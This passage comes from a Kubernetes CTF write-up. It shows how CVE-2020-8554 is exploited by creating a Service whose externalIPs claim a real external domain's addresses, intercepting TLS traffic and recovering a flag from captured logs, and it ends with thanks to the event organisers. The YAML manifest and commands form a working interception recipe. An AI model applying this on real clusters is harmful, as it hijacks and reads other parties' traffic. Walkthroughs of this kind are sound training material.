- let's do a MITM using [CVE-2020-8554](https://blog.champtar.fr/K8S_MITM_LoadBalancer_ExternalIPs/)
- let's get all the IPv4 of the control-plane website
```bash
root@jumphost:~# nslookup control-plane.io
;; Got recursion not available from 10.96.0.10
;; Got recursion not available from 10.96.0.10
;; Got recursion not available from 10.96.0.10
Server:		10.96.0.10
Address:	10.96.0.10#53

Name:	control-plane.io
Address: 104.26.1.119
Name:	control-plane.io
Address: 172.67.74.188
Name:	control-plane.io
Address: 104.26.0.119
Name:	control-plane.io
Address: 2606:4700:20::ac43:4abc
Name:	control-plane.io
Address: 2606:4700:20::681a:77
Name:	control-plane.io
Address: 2606:4700:20::681a:177
```
- let's create a `ClusterIP` service with multiple `externalIPs`. Make sure to use the correct selector
```yaml
apiVersion: v1
kind: Service
metadata:
  name: mitm-service
  namespace: cluster-maintenance
spec:
  selector:
    app: cluster-maintenance
  ports:
    - protocol: TCP
      port: 443
      targetPort: 8443
  externalIPs:
  - 104.26.1.119
  - 172.67.74.188
  - 104.26.0.119
```
- check the logs of the `cluster-maintenance` API
```bash
root@jumphost:~# curl -k https://api.cluster-maintenance/logs
2025/06/25 14:29:47 Server starting...
...
2025/06/25 15:14:09 [DEBUG] method=POST path=/submit headers=[User-Agent=Go-http-client/1.1; Content-Length=69; Content-Type=application/json; Accept-Encoding=gzip] body={"flag":"flag_ctf{tls_verification_is_very_important_CVE-2020-8554}"}
```

# Wrap up

Finally, I want to thank the team who helped bring this CTF to life. Thank you to Mario and Aiman for being on the ground in India to run the event, and to Gabriela, Tom, and Sam for their essential help in testing the scenarios beforehand.

Stay tuned for the KubeCon US CTF event!